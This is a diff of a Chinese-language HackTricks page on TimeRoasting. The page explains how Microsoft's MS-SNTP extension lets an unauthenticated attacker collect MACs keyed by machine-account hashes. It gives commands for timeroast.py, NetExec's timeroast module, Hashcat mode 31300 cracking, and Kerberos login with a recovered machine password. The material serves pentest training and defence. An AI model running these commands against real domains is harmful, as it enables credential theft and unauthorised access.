@@ -2,39 +2,58 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-timeRoasting，主要原因是微软在其对NTP服务器的扩展中留下的过时身份验证机制，称为MS-SNTP。在该机制中，客户端可以直接使用任何计算机帐户的相对标识符（RID），域控制器将使用计算机帐户的NTLM哈希（由MD4生成）作为生成响应数据包的**消息认证码（MAC）**的密钥。
+TimeRoasting 利用旧版 MS-SNTP 身份验证扩展。在 MS-SNTP 中，客户端可以发送一个 68 字节的请求，其中嵌入任意计算机账户的 RID；域控制器使用该计算机账户的 NTLM 哈希 (MD4) 作为密钥，对响应计算 MAC 并返回。攻击者可以未经认证地收集这些 MS-SNTP MAC 并离线破解（Hashcat mode 31300）以恢复计算机账户密码。
 
-攻击者可以利用该机制在不进行身份验证的情况下获取任意计算机帐户的等效哈希值。显然，我们可以使用像Hashcat这样的工具进行暴力破解。
-
-具体机制可以在[官方Windows文档的MS-SNTP协议](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)的3.1.5.1节“身份验证请求行为”中查看。
-
-在文档中，3.1.5.1节涵盖了身份验证请求行为。
+参见官方 MS-SNTP 规范中第 3.1.5.1 节 “Authentication Request Behavior” 和第 4 节 “Protocol Examples” 以获取详细信息。
 ![](../../images/Pasted%20image%2020250709114508.png)
-可以看出，当ExtendedAuthenticatorSupported ADM元素设置为`false`时，原始Markdown格式得以保留。
+当 ExtendedAuthenticatorSupported ADM element 为 false 时，客户端发送一个 68 字节的请求，并将 RID 嵌入到 authenticator 的 Key Identifier 子字段的最低有效 31 位中。
 
->原文引用：
->>如果ExtendedAuthenticatorSupported ADM元素为false，则客户端必须构造一个客户端NTP请求消息。客户端NTP请求消息的长度为68字节。客户端按照2.2.1节的描述设置客户端NTP请求消息的认证字段，将RID值的最低有效31位写入认证的密钥标识符子字段的最低有效31位，然后将密钥选择器值写入密钥标识符子字段的最高有效位。
+> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.
 
-在文档第4节协议示例第3点
+来自第 4 节（协议示例）：
 
->原文引用：
->>3. 在接收到请求后，服务器验证接收到的消息大小为68字节。如果不是，服务器要么丢弃请求（如果消息大小不等于48字节），要么将其视为未认证请求（如果消息大小为48字节）。假设接收到的消息大小为68字节，服务器从接收到的消息中提取RID。服务器使用它调用NetrLogonComputeServerDigest方法（如[MS-NRPC]第3.5.4.8.2节所述）来计算加密校验和，并根据接收到的消息中密钥标识符子字段的最高有效位选择加密校验和，如3.2.5节所述。然后，服务器向客户端发送响应，将密钥标识符字段设置为0，将加密校验和字段设置为计算出的加密校验和。
+> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.
 
-根据上述微软官方文档的描述，用户不需要任何身份验证；他们只需填写RID以发起请求，然后就可以获得加密校验和。加密校验和在文档的3.2.5.1.1节中进行了说明。
+该 crypto-checksum 基于 MD5（参见 3.2.5.1.1），可以离线破解，从而使 roasting attack 成为可能。
 
->原文引用：
->>服务器从客户端NTP请求消息的认证字段的密钥标识符子字段的最低有效31位中检索RID。服务器使用NetrLogonComputeServerDigest方法（如[MS-NRPC]第3.5.4.8.2节所述）使用以下输入参数计算加密校验和：
->>>![](../../images/Pasted%20image%2020250709115757.png)
+## 攻击方法
 
-加密校验和是使用MD5计算的，具体过程可以参考文档内容。这为我们提供了进行roasting攻击的机会。
-
-## how to attack
-
-引用 https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/
-
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort的Timeroasting脚本
-```
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
+```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
 ```
+---
+
+## 实战攻击 (unauth) 使用 NetExec + Hashcat
+
+- NetExec 可以在未认证的情况下枚举并收集计算机 RIDs 的 MS-SNTP MACs，并打印可用于破解的 $sntp-ms$ 哈希：
+```bash
+# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
+netexec smb <dc_fqdn_or_ip> -M timeroast
+# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
+```
+- 使用 Hashcat mode 31300 (MS-SNTP MAC) 离线破解：
+```bash
+hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
+# or let recent hashcat auto-detect; keep RIDs with --username for convenience
+```
+- 恢复的 cleartext 对应计算机账户密码。NTLM 被禁用时，尝试直接以机器账户使用 Kerberos (-k)：
+```bash
+# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
+netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
+```
+操作提示
+- 在使用 Kerberos 之前确保时间同步准确: `sudo ntpdate <dc_fqdn>`
+- 如有需要，为 AD 域生成 krb5.conf: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
+- 一旦获得任何经过认证的 foothold，随后通过 LDAP/BloodHound 将 RIDs 映射到 principals。
+
+## 参考资料
+
+- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
+- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
+- [NetExec – official docs](https://www.netexec.wiki/)
+- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 {{#include ../../banners/hacktricks-training.md}}
